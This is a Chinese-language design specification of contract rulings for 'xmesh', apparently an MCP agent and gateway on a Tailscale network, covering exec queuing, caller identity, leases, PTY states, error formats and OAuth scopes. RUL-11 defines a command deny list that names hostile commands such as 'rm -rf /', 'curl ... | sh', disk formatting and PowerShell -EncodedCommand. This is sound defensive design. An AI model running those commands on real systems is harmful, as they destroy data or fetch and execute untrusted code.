# 契约裁定

这些裁定补上方案里没有写死、但缺少唯一行为就无法测试的点。它们从 2026-10-15 起成为契约的一部分。推翻某条裁定时，修改本节、受影响的 `CTR-*`，并在 [已决事项](../design/11-decisions.md) 追加一条记录。

## RUL-01

`exec.run` 在槽位不足时，在本次调用剩余的 `timeout` 内阻塞等待。队列按 FIFO，并在有多个等待者时按 `caller_id` 轮转，避免一个调用方占满等待队列。

若剩余超时不够排到队首，或等待队列长度已经达到 `exec.max_concurrent`（默认与槽位数相同，即再排队一个就会超过「槽 + 等长队列」），立即返回 `exec_saturated`。字段 `queue_position` 是若接受本次调用它将处在的位置（从 1 开始）。字段 `retry_after_ms` 必须给出，取正在运行的命令里最早可能结束的剩余时间；估计不了时用 1000。命令进程不得已启动。

不返回「先排队、稍后另开一次调用来取结果」的异步句柄。幂等重试靠 `idempotency_key`。

## RUL-02

`caller_id` 的规范形式是：

```text
caller_id = node_id + "/" + mcp_session_id
```

- `node_id` 是对端的 Tailscale 稳定节点 ID（WhoIs 的 Node.ID），不是 MagicDNS 主机名。主机名会变，节点 ID 用来做 owner。
- `mcp_session_id` 是 Streamable HTTP 的 `Mcp-Session-Id`。没有会话头的初始化请求使用 `init` 这个字面量，且不能持有 PTY 或租约。
- 经公网入口转发时，Agent 看到的 `node_id` 是入口节点的节点 ID，`mcp_session_id` 是入口与该上游 OAuth 会话对应的下游 MCP 会话。入口必须为每个上游 OAuth 会话使用独立的下游 MCP 会话，使不同云端会话不会共享 owner。入口在每条下游 MCP 请求上带请求头 `X-Xmesh-Oauth-Client`，值是 OAuth `client_id`。Agent 只在对端 tag 含 `tag:ingress` 时采信这个头，并记在该 MCP 会话上；tag 是 ingress 但头缺失时拒绝会话，错误码 `unauthenticated`。其他 tag 送来的这个头忽略。审计在入口侧另记 `oauth_client`。

本机 Claude Code / Codex CLI → 本机 Gateway（每个请求都要令牌，来源与 Host 按 [CTR-GW-07](gateway.md#ctr-gw-07)）→ 本机 Agent 这条路，在本节点已经有 tailnet 身份之后，`node_id` 用本节点自己的 Tailscale 稳定节点 ID，不用字面量 `local`。Gateway 与 Agent 同进程转发时，Agent 从本进程的 tsnet 身份读取这个 ID，不依赖对 `127.0.0.1` 做 WhoIs。不同的本机 MCP 会话仍靠 `mcp_session_id` 区分，所以两份本机对话不会共享 PTY owner 或租约。

只有节点还没有 tailnet 身份时（阶段 1 的本机验收，或 tailnet 尚未连上），并且对端是 `127.0.0.1` 或调用来自进程内 Gateway，`node_id` 才用字面量 `local`。tailnet 身份一旦可用，同一条环回路径立刻改用本节点 ID。已经发出的 `local/...` owner 不迁移，随那些会话结束消失。

## RUL-03

`backend.acquire`、`backend.renew`、`backend.release` 是 Agent 的内置工具，不是后端进程列出的工具。Gateway 可以替当前 MCP 会话调用它们，模型也可以直接调用。exclusive 后端的业务工具不隐含自动加锁：没带 `_lease_token` 就返回 `lease_required`，避免两个模型交替调用把 IDA 上下文串掉。

心跳是调用方或 Gateway 周期性 `backend.renew`。Agent 不根据业务工具调用顺便续期，以免只读探测把租约无限延长。业务工具成功不改变 `Expires`。

## RUL-04

幂等缓存的键是 `(caller_id, idempotency_key)`。其他调用方提交同一个字符串不会拿到这份 stdout。这避免跨会话泄漏命令输出。同一 caller 的缓存命中跳过策略引擎之外的执行，但**不**跳过授权与策略：第二次调用若已被新策略拒绝，返回 `policy_denied`，不返回缓存。

## RUL-05

`exec.run` 的 stdout 与 stderr 各自内联上限为 `exec.inline_output_bytes`，默认 256 KiB。超过的部分不放进工具结果，`truncated: true`，并返回 `output_ref`。合并后的溢出内容保留到 `exec.output`，保留时间与幂等缓存相同，重启即失。方案原文只要求分页句柄，没有写内联阈值，故阈值做成配置，默认值写死在契约里，避免实现各选一个。

## RUL-06

`_lease_token` 是所有工具请求里表示 fencing token 的唯一参数名，包括 exclusive 后端的业务工具，以及 `backend.renew`、`backend.release`。类型为十进制字符串或 JSON 整数，规范比较时按无符号整数，与租约对象里的 `token` 字段比较。租约对象和 `backend.acquire` 的返回值仍使用字段名 `token`，那是结果，不是请求参数。

Agent 在授权通过后读取 `_lease_token`。转发给后端之前必须删除。后端若自己的工具也有同名字段，仍然被剥离；后端工具不得使用这个名字。文档在接入后端时说明这一保留名。禁止再接受名为 `token` 的请求参数作为租约凭证。多出来的 `token` 参数按普通业务字段处理：业务工具会把它原样转发，renew / release 会因缺少 `_lease_token` 而失败。

## RUL-07

PTY 四个状态的规范名是 `active`、`orphaned`、`closed`、`released`。`pty.list` 不返回 `released`。语义见 [CTR-PTY-01](pty.md#ctr-pty-01)。

## RUL-08

工具失败时，MCP `tools/call` 的结果使用：

- `isError: true`
- `structuredContent` 等于错误对象，必须通过 [error.schema.json](schemas/error.schema.json)
- 一条 `type: text` 的 content，正文是该对象的紧凑 JSON，供只读文本的客户端使用

成功结果放在 `structuredContent`，并附一条文本 JSON。禁止只返回人类可读句子而不给结构化对象。

## RUL-09

scope 语法以 [CTR-OAUTH-02](oauth-authz.md#ctr-oauth-02) 为准。配置示例中的 `fs:*` 等价于同时授予 `fs:read:*` 与 `fs:write:*`。`exec:*` 等价于 `exec:*`（设备通配，没有更细的读与写）。实现接受简写，内部展开成规范 scope 再比较。

## RUL-10

`fs.edit` 零匹配与多匹配使用单独错误码 `edit_not_found` 与 `edit_ambiguous`，不用 `conflict`。`conflict` 只表示 `expected_sha256` 与当前内容不一致，或 `fs.move` 的目标已存在。这样模型能区分「字符串没找到」和「文件被别人改了」。

## RUL-11

命令黑名单匹配规范化后的 argv 序列，不匹配单个参数，也不把命令交给 shell 再匹配。配置里的 `rm\s+-rf\s+/`、`curl\s+.*\|\s*sh` 因此能够命中 `["rm","-rf","/"]` 和写在 `sh -c` 脚本里的管道。

规范化只用于策略匹配。真正启动进程时仍然使用原始 `cmd` 与 `args`，见 [CTR-EXEC-01](exec.md#ctr-exec-01)。

### 命令行

1. `base` 取 `cmd` 的路径基名。Windows 上再去掉不区分大小写的 `.exe` 后缀。
2. 每个参数单独引用：若匹配 `^[A-Za-z0-9_@%+=:,./-]+$` 则原样，否则用 POSIX 单引号包起来，内部的 `'` 写成 `'\''`。空字符串引用成 `''`。
3. `line` 等于 `base`；有参数时再加一个空格，然后把引用后的参数用单个空格接上。
4. 每条 `deny_patterns` 都是 RE2，对 `line` 做搜索，不要求整行匹配。任一命中即 `policy_denied`。
5. 识别 shell 时 `base` 不区分大小写。因此 `cmd.exe` 去掉 `.exe` 后的 `cmd` 与 `CMD` 是同一个基名。满足下面任一条件时，紧随该参数的下一个参数是脚本，再按第 4 步搜索一遍，不套外层引号：
   - `base` 是 `sh`、`bash`、`zsh`、`dash` 之一，且某个参数恰好是 `-c`。
   - `base` 是 `pwsh` 或 `powershell`，且某个参数不区分大小写地等于 `-Command`。
   - `base` 是 `cmd`，且某个参数不区分大小写地等于 `/c`。默认 shell 是 `pwsh`，但 `exec.run` 仍可以显式启动 `cmd /c`，这条不能漏。

`python -c`、`node -e` 以及其他解释器的单行脚本不在这次二次搜索范围内。解释器脚本靠 L1 命令策略和 L2 隔离，不靠把每一种 `-c` / `-e` 都列进 shell 名单。

| cmd | args | line | 额外搜索 |
| --- | --- | --- | --- |
| `rm` | `["-rf", "/"]` | `rm -rf /` | 无 |
| `/bin/rm` | `["-rf", "/"]` | `rm -rf /` | 无 |
| `sh` | `["-c", "curl http://x \| sh"]` | `sh -c 'curl http://x \| sh'` | `curl http://x \| sh` |
| `cmd` | `["/c", "curl http://x \| sh"]` | `cmd /c 'curl http://x \| sh'` | `curl http://x \| sh` |
| `cargo` | `["build"]` | `cargo build` | 无 |

按单个元素匹配时，`rm\s+-rf\s+/` 不会命中 `"-rf"` 或 `"/"`。本裁定排除那种实现。

### 内置规则

[CON-SEC-10](../constraints/security.md#con-sec-10) 的三条 exec 规则跑在同一套 `line` 和脚本原文上，即使用户没有写 `deny_patterns`：

- `exec.deny.rm_rf_root` 搜索 `(?i)\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f[a-zA-Z]*|--recursive)\s+(/|[A-Za-z]:\\)(\s|$)`。
- `exec.deny.curl_pipe_sh` 搜索 `(?i)\bcurl\b[^|\n]*\|\s*(sh|bash|zsh|pwsh|powershell)\b`。
- `exec.deny.format`：`base` 为 `format`，或搜索 `(?i)\bformat\s+[A-Za-z]:`。

argv 里出现恰好等于 `-EncodedCommand` 的参数时，直接 `policy_denied`，规则名 `exec.deny.encoded_command`。不解码载荷。`allow_dangerous: true` 才能关掉这条和上表三条。

## RUL-12

`pty.max_sessions` 只数 `active` 与 `orphaned`。`closed` 不占这个名额。进程已经退出，缓冲再占着设备配额，会让一次断线在 `orphan_grace` 加 `closed_retain` 的时间里吃掉名额。

`closed` 另有上限 `pty.closed_retain_max`，默认 20。超过时把关闭时间最早的 `closed` 立刻标成 `released` 并丢掉缓冲，不等保留期结束。这不返回错误。之后对该 id 的 `pty.read` 得到 `session_not_found`。

`pty_limit` 的计数字段叫 `in_use`，见 [CTR-ERR-01](errors.md#ctr-err-01)。`scope` 为 `device` 时它是 `active` 与 `orphaned` 之和；`scope` 为 `caller` 时它是该调用方的 `active` 数。它不是 `pty.list` 里 `state` 为 `active` 的条数。

## RUL-13

`orphaned` 会话被接管时，除了 [CTR-PTY-02](pty.md#ctr-pty-02) 的 `node_id` 条件，还要看 open 时记下的 `oauth_client`：

- 会话带有 `oauth_client`：新 owner 所在 MCP 会话必须记下同一个 `oauth_client`。经同一入口进来的 Codex 会话不能接管 Claude 会话留下的终端。两者的 `node_id` 都是入口节点，只比 `node_id` 不够。
- 会话没有 `oauth_client`（本机环回或 tailnet 直连）：仍然只要求 `node_id` 相同。同一台设备上的另一个本机会话可以在断线后接回终端。

`oauth_client` 来自 [RUL-02](#rul-02) 的请求头，在 `pty.open` 时复制到会话上，不从工具参数读取。这不是「单租户下可以放宽」的默认行为。

`active` 会话的 `pty.transfer` 不套用上面的 `oauth_client` 限制。调用方必须是当前 owner，这一步是 owner 自愿把终端交给 `to_caller`，允许交给另一个 OAuth client 的会话。接收方仍须是 Agent 已经见过、并且仍然连接着的 `caller_id`，同时不能超过对方的 `max_per_caller`。限制只加在没有 owner 的 `orphaned` 接管上，避免另一个云端会话在无人同意时接走终端。

## RUL-14

发布物有两个：`xmesh`（内核，纯 Go，单一二进制）和 `xmesh-ui`（可选，Electron 托盘加面板）。[CON-ARCH-02](../constraints/architecture.md#con-arch-02) 的「单一二进制」指内核；UI 是可选的第二发布物，不属于必须同时部署的服务，内核没有它必须完整可用（[CON-ARCH-10](../constraints/architecture.md#con-arch-10)）。

## RUL-15

`status.warnings` 与 `sys.info.warnings` 的差别：`sys.info` 的 `warnings` 是字符串数组，措辞可变，调用方不得依赖。控制通道的 `status.warnings` 是 `{code, severity, message}` 对象数组，`code` 稳定，因为托盘图标要靠它区分「需要重启」「热加载失败」「对端离线」。除此之外 `StatusResponse` 包含 `sys.info` 的全部字段，语义相同。两处的警告来源是同一份内核状态，文字可以相同。

## RUL-16

drain 经控制通道重复调用的结果是确定的，不报错：已在 `keep` 时再发 `keep` 是 no-op；`keep` 升级为 `kill` 允许并立即终止 PTY 与租约，`since` 保持首次进入 drain 的时间；`kill` 降级为 `keep` 返回 `conflict`（`reason: drain_downgrade`），因为被终止的资源回不来，要降级必须先 `resume`；未在 drain 时 `resume` 是 no-op。

## RUL-17

经控制通道的审计记录用 `event: control_call`、`actor: control`。`caller` 为 `control:<连接身份>`（Unix 为 `uid-<数字>`，Windows 为 SID），`tool` 为路由编号，`device` 为本节点名。只记非 `GET` 请求，`args_digest` 只含键名与字节数。`actor` 缺省等于 `mcp`，已有记录不需要迁移。

## RUL-18

托盘状态的优先级是：未运行，版本不匹配，排空中，需重启，降级，正常，取第一条命中的（[CTR-CTL-03](control.md#ctr-ctl-03)）。降级只看 `severity` 为 `warning` 或 `error` 的警告；`restart_required` 与 `allow_dangerous` 是 `info`，不使图标变黄。理由：排空是用户主动动作，应该比被动告警更显眼；需重启已有专门图标，不重复变黄。

## RUL-20

`meshadmin` 的 `Provider` 接口是两个控制面的唯一分界。调用方只通过 `Capabilities()` 判断某个控制面能不能做某件事（例如 `policy_write`、`atomic_policy_write`），不按 `Kind()` 分支，也不拼控制面各自的路径。Headscale 以文件模式运行时策略只读，`policy_write` 为假，写入返回 `ErrUnsupported`，预览里 `writable` 为假。

编号 RUL-14 到 RUL-18 已由桌面 UI 与本机控制通道的设计占用，本篇从 RUL-20 起。

## RUL-21

写策略的统一路径是：读版本、生成新文本、控制面校验、预览、快照、带版本写入。其中版本检查的强度取决于控制面：

- Tailscale 用 `If-Match`（ETag），由服务器原子判断。
- Headscale 的 `PUT /api/v1/policy` 不接受版本条件，`meshadmin` 在写前重新读取并与 `base_version` 比较，再发 PUT。这一步读与写之间有很小的窗口，不是原子的；`Capabilities().atomic_policy_write` 为假，调用方传 `--expect-version` 把窗口缩到「预览与写入之间」之外，并在文档里把它记为已知限制。

`updatedAt` 在 Headscale 文件模式下为 `null`，据此判定策略不可写。数据库模式下从没存过策略时 `GET` 返回 500 `acl policy not found`，当作没有策略。

xmesh 只修改带 `// xmesh:managed <section>` 标记的元素，见 [CON-MESH-04](../constraints/meshadmin.md#con-mesh-04)。

## RUL-22

管理凭据有 `read` 与 `write` 两份。读操作优先 `read`，没有时才用 `write`；写操作只用 `write`。Tailscale 的 OAuth client 的 scope 在签发时固定，`read` 凭据发起写请求时控制面返回 403，`meshadmin` 把它映射成 `ErrUnauthorized`（带所需 scope 的 `ScopeError`），不重试、不换凭据。

OAuth client 的 token 由 `meshadmin` 用 client credentials 换取并缓存在内存，进程退出即丢弃，不落盘。`Credential` 的 `String()`、`GoString()` 与错误信息都不含密钥。
